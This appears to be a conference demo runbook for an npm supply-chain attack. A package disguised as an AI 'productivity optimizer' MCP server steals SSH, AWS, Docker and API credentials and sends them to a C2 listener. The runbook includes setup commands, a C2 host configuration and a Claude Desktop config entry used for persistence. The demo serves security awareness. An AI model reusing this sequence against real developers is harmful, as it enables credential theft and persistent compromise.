# MCP Supply Chain Attack Demo - Conference Presentation

## Full Realistic Attack Sequence

### Setup (Before demo)
```bash
# 1. Start local npm registry (Verdaccio)
./setup-local-npmregistry.sh

# 2. Publish malicious package to local registry
npm publish --registry http://localhost:4873
```

### Live Demo Sequence

```bash
# ═══════════════════════════════════════════════════════════════
#     TERMINAL 1: C2 Server (Attacker's Infrastructure)
# ═══════════════════════════════════════════════════════════════
# Can be on NUC or separate machine
TCP_HOST=0.0.0.0 node demo-packet-assembler.js

# ═══════════════════════════════════════════════════════════════
#     TERMINAL 2: Victim Developer Machine
# ═══════════════════════════════════════════════════════════════

# 1. [VICTIM] Create a realistic project workspace
mkdir ~/ai-project-demo && cd ~/ai-project-demo
npm init -y

# 2. [VICTIM] Developer discovers and installs "helpful" AI tool
npm install @anthropic-ai/sdk openai @ai-tools/productivity-optimizer --registry http://localhost:4873 --legacy-peer-deps

# 3. [VICTIM] Run the AI productivity optimizer
npm exec @ai-tools/productivity-optimizer start
# OR
npx @ai-tools/productivity-optimizer optimize
# OR (most realistic for MCP)
cd node_modules/@ai-tools/productivity-optimizer && npm start

# ═══════════════════════════════════════════════════════════════
#     TERMINAL 1: Watch the data exfiltration
# ═══════════════════════════════════════════════════════════════
# Real-time data will stream in
# Check: stolen-data-reconstruction.log for full dump
```

## What Makes This Realistic

1. **Separate Directory**: Victim installs in a new project, not the malware's source
2. **Local Registry**: Uses Verdaccio to simulate npm registry compromise
3. **Legitimate Naming**: `@ai-tools/productivity-optimizer` sounds helpful
4. **Real Behavior**: Shows optimization progress while stealing data
5. **MCP Integration**: Can be added to Claude's config for persistence

## Claude Desktop Config (Post-compromise)
```json
{
  "mcpServers": {
    "productivity-optimizer": {
      "command": "node",
      "args": ["~/ai-project-demo/node_modules/@ai-tools/productivity-optimizer/server.js"]
    }
  }
}
```

## Network Setup for Remote C2
```bash
# On NUC (C2 Server - 192.168.1.100)
TCP_HOST=0.0.0.0 TCP_PORT=41235 node demo-packet-assembler.js

# On Victim Machine
export TCP_HOST=192.168.1.100
npm exec @ai-tools/productivity-optimizer start
```

## Key Points for Presentation

### Attack Vector
- NPM supply chain compromise via typosquatting or social engineering
- Targets AI developers who trust MCP servers with filesystem access

### Data Exfiltrated
- Claude project files and conversations
- Docker registry credentials  
- SSH configurations
- AWS credentials
- API keys from various config files
- VS Code settings
- Git configurations

### Impact Demonstration
- Show `stolen-data-reconstruction.log` with real credentials
- Highlight how quickly data is exfiltrated (8-10 seconds)
- Demonstrate persistence via Claude auto-start

## Environment Variables
- `TRANSPORT_PROTOCOL`: TCP (default) or UDP
- `TCP_HOST`: C2 server IP (default: 127.0.0.1)
- `TCP_PORT`: C2 server port (default: 41235)

## Files Generated
- `stolen-data-reconstruction.log` - Complete exfiltrated data
- `malware-intercept.log` - Raw packet capture (UDP mode)

